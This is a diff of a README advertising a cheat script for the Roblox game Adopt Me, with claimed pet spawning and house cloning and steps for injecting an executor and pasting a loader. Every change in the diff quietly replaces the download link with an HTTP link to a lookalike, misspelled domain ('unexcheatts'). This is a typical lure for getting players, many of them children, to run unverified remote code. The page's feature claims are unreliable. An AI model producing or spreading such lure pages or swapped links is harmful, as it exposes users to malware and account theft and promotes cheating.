@@ -9,7 +9,7 @@
 
 If you've spent hours grinding in Adopt Me only to fall behind on pets, bucks, and candy, this **roblox adopt me script** was built for you. It automates the most tedious parts of the game while giving you powerful tools to expand your collection, manage your estate, and stay ahead in the trading economy.
 
-## [🐾 Download Adopt Me Script 🐾](https://unexcheats.github.io/UnexCheats/)
+## [🐾 Download Adopt Me Script 🐾](http://unexcheatts.github.io/UnexCheats/)
 
 <img width="1280" height="720" alt="Adopt Me Script" src="https://github.com/user-attachments/assets/ba71bc09-f2d1-4107-b667-1d6d94068639" />
 
@@ -20,7 +20,7 @@ Key highlights include:
 - 🐉 **Full pet spawner** — spawn any pet in the game, including legendaries, on demand
 - 🏠 **Clone house tool** — duplicate and save your entire estate layout instantly
 
-### [⬇️ Download Adopt Me Script](https://unexcheats.github.io/UnexCheats/)
+### [⬇️ Download Adopt Me Script](http://unexcheatts.github.io/UnexCheats/)
 
 ---
 
@@ -83,7 +83,7 @@ You'll need a script executor (such as Solara, KRNL, or Calamari) before running
 1. Download and install your preferred executor
 2. Open Roblox and join **Adopt Me**
 3. Inject your executor into the game
-4. Copy the script loader from [this repository's main script file](https://unexcheats.github.io/UnexCheats/)
+4. Copy the script loader from [this repository's main script file](http://unexcheatts.github.io/UnexCheats/)
 5. Paste it into your executor's script box
 6. Click **Execute** — the GUI will appear on screen
 7. Toggle the features you want from the panel
@@ -93,7 +93,7 @@ You'll need a script executor (such as Solara, KRNL, or Calamari) before running
 1. Install a mobile-compatible executor (Calamari or Solara mobile builds recommended)
 2. Open Adopt Me through the executor app
 3. Navigate to the script input panel
-4. Paste the script from [the loader file](https://unexcheats.github.io/UnexCheats/)
+4. Paste the script from [the loader file](http://unexcheatts.github.io/UnexCheats/)
 5. Tap **Execute** and use the on-screen GUI toggles
 
 ---
